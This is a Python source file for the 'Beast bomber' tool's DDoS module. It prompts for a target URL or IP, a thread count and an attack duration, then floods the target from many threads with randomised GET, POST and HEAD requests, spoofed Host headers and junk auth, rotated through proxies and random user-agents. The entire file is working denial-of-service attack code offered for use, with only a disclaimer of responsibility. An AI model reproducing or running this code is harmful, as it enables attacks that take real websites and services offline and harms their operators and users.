"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1cum                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2023 un1cum                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import os
import time
import fade
import ctypes
import random
import asyncio
import aiohttp
import socket
import base64
import urllib3
from datetime import datetime
from pythonping import ping
from sys import platform
from threading import Thread, Lock
from fake_useragent import UserAgent
from colorama import Fore, Style, Back, init
from core.etc.functions import logo_ddos, get_lang, get_proxies

urllib3.disable_warnings()
init()


class DDoSAttack:
    def __init__(self):
        self.r = '0'
        self.r2 = '0'
        self.text = "{}"
        self.url2 = ''
        self.ports = []
        self.lock = Lock()
        self.lang = get_lang()
        self.todo = 0
        self.started = 0
        self.ua = UserAgent(verify_ssl=False)
        self.proxies = get_proxies()
        self.lib = "1234567890qwertyuiop[]asdfghjkl;'zxcvbnm,./_"

    def stat(self):
        if platform == 'win32':
            ctypes.windll.kernel32.SetConsoleTitleW(f"💣 ・ Successs: {self.r}")

        if self.started == self.todo:
            with self.lock:
                if self.lang == 'ru':
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'СТАТУС' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'ОТПРАВЛЕНО: ' + Fore.MAGENTA + self.r + Fore.RED + ' ОШИБКИ: ' + self.r2)
                else:
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'STATUS' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'SENT: ' + Fore.MAGENTA + self.r + Fore.RED + ' FAILS: ' + self.r2)

    async def ddos_thread(self, target, use_proxy, proxy):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            user = self.ua.random
            now = datetime.now()
            st = ''
            st2 = ''

            if use_proxy == "y" and proxy == "":
                proxy_2 = "http://" + random.choice(self.proxies)
            elif proxy != "":
                proxy_2 = proxy
            else:
                proxy_2 = ""

            for _ in range(random.randint(10, 200)):
                st += random.choice(self.lib)

            for _ in range(random.randint(100, 500)):
                st2 += random.choice(self.lib)

            header = {'user-agent': user}

            try:
                host = self.url2.replace('http://', '')
                host = self.url2.replace('https://', '')
                host2 = host.split('/')[0]
                ping(host2, verbose=False)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                fake_ip = '182.21.20.32'
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, 80))
                sock.sendto(("GET /" + target + " HTTP/2\r\n").encode('ascii'), (target, 80))
                sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, 80))
                sock.close()
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2 + '/' + st2, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2, headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2 + '/' + st2, headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, data=st, headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, data=st, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, json=st, headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, json=st, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.head(self.url2, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, auth=(st, st), timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2, auth=(st, st), timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.post(self.url2, auth=(st, st), headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

            try:
                await session.get(self.url2, auth=(st, st), headers=header, timeout=3, proxy=proxy_2)
                self.r = str(int(self.r) + 1)
                self.stat()
            except:
                self.r2 = str(int(self.r2) + 1)
                self.stat()

    def run_thread(self, time_a, target, use_proxy, proxy=""):
        if self.url2[-1] == '/':
            self.url2 = self.url2.rstrip('/')

        t = time.monotonic()
        if use_proxy != 'y':
            proxy = ""
        while time.monotonic() - t < time_a:
            asyncio.run(self.ddos_thread(target, use_proxy, proxy))

    def start_ddos(self):
        if platform == 'win32':
            os.system("cls")
        else:
            os.system("clear")

        state = ''
        url4 = ''

        logo_ddos()

        if self.lang == 'ru':
            text = "\nUrl или IP для атаки > "
        else:
            text = "\nUrl or IP for attack > "

        url = input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN)
        self.url2 = url

        if url.find("http://") != -1:
            url = url.replace('http://', '')
            try:
                url3 = url.replace('.', '')
                url3 = int(url3)
                state = 'ip'
            except:
                state = 'url'

        elif url.find("https://") != -1:
            url = url.replace('https://', '')
            try:
                url3 = url.replace('.', '')
                url3 = int(url3)
                state = 'ip'
            except:
                state = 'url'

        else:
            state = 'ip'

        ok = True

        if state == 'url':
            cnt = 0
            for symb in url:
                if symb == '/':
                    cnt += 1
                if cnt == 3:
                    break
                url4 += symb

            try:
                url4 = url4.split('/')[0]
                url = socket.gethostbyname(url4)
            except:
                if self.lang == 'ru':
                    text = 'Во время обработки url произошла ошибка, проверьте правильность введенных данных.'
                else:
                    text = 'An error occurred while processing the url, check that the data entered is correct.'
                print(Back.RED + Fore.WHITE + text + Fore.RESET + Style.RESET_ALL)
                time.sleep(2)
                ok = False

        if ok is True:
            if self.lang == 'ru':
                text = 'IP цели: '
                text2 = 'Использовать прокси? (y/n) > '
                text3 = 'Потоки > '
                text4 = 'Время атаки (в сек.) > '
                text5 = '\n!НЕ РЕКОМЕНДУЕТСЯ!'
                text6 = '\nЗапустить потоки для каждой прокси? (y/n) > '
                text7 = 'поток запущен'
            else:
                text = 'Target IP: '
                text2 = 'Use proxies? (y/n) > '
                text3 = 'Threads > '
                text4 = 'Time attack (in sec.) > '
                text5 = '\n!NOT RECOMMENDED!'
                text6 = '\nStart threads for every proxy? (y/n) > '
                text7 = 'thread started'

            print(Back.YELLOW + Fore.BLACK + text + url + Fore.RESET + Style.RESET_ALL)

            if not self.proxies:
                use_proxy = 'n'
            else:
                use_proxy = input(Fore.YELLOW + Style.BRIGHT + text2 + Fore.GREEN).lower()

            self.todo = int(input(Fore.YELLOW + Style.BRIGHT + text3 + Fore.GREEN))
            time_attack = int(input(Fore.YELLOW + Style.BRIGHT + text4 + Fore.GREEN))

            if use_proxy == 'y':
                print(Back.RED + Fore.WHITE + text5 + Fore.RESET + Style.RESET_ALL)
                proxy_threads = input(Fore.YELLOW + Style.BRIGHT + text6 + Fore.GREEN).lower()
            else:
                proxy_threads = 'n'

            th = None

            if proxy_threads == 'y':
                for proxy in self.proxies:
                    for count in range(self.todo):
                        th = Thread(target=self.run_thread, args=(time_attack, url, use_proxy, proxy,))
                        th.start()
                        self.started += 1
                        print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                              Fore.YELLOW + Style.BRIGHT + text7)

            else:
                for count in range(self.todo):
                    th = Thread(target=self.run_thread, args=(time_attack, url, use_proxy,))
                    th.start()
                    self.started += 1
                    print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                          Fore.YELLOW + Style.BRIGHT + text7)

            time.sleep(1)

            th.join()
